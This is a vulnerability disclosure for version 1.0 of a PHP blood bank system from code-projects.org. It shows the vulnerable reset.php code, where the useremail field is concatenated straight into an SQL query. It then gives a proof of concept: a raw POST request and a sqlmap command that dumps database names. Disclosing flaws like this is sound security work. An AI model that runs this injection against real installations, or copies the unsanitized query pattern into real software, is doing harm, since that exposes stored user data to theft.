# blood-bank-system-in-php-sql-injection

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

## AFFECTED  VERSION(S)

### Vulnerable File

reset.php  and $usermail parameter 

### VERSION(S)

-  v1.0

### Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

## PROBLEM TYPE

network remote.

## Vulnerability Type

sql injection

## Root Cause

In reset.php file and $usermail parameter,   SQL injection is used to obtain database information.

## Impact

## **Description of the vulnerability**

### reset.php

source code，the    $useremail parameter is not filtered and concatenated into the SQL statement.                                                                                                                                                                                                                                                                                                                                                                                                                                                               

```
      <?php
      
require 'functions/functions.php';
require_once 'connection.php';
      $user= $pass="";
      if(isset($_POST['sub']))
      {
       $useremail=$_POST['useremail'];
        $q=$db-> prepare("SELECT * from login where useremail='$useremail'");
        $q->execute();
        $res=$q->fetchAll(PDO::FETCH_OBJ);
        if($res)
        {
         $_SESSION['useremail']=$useremail;
         header("location:successfull.html");
        }
        else
        {
          echo"<script>alert('Wrong email or password')</script>";
        }
          
          function test_input($data){
            $data=trim($data);
            $data=stripslashes($data);
            $data=htmlspecialchars($data);
            return $data;

          }

      }
?>
```

## **Vulnerability recurrence**

### **POC**

```
POST /reset.php HTTP/1.1
Host: bloodbankmgmtsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://bloodbankmgmtsystem
Connection: close
Referer: http://bloodbankmgmtsystem/reset.php
Cookie: PHPSESSID=8naqhmhttbn8jta9roecg7nsoq
Upgrade-Insecure-Requests: 1
Priority: u=0, i

sub=1&useremail=2
```

save as sql.txt，excute the command.

```
python sqlmap.py -r "D:\sql.txt"    --dbs
```

get databases name.

![image-20241011162422264](https://github.com/user-attachments/assets/97b6bf50-6526-4a39-8a8b-65d07116bf1a)

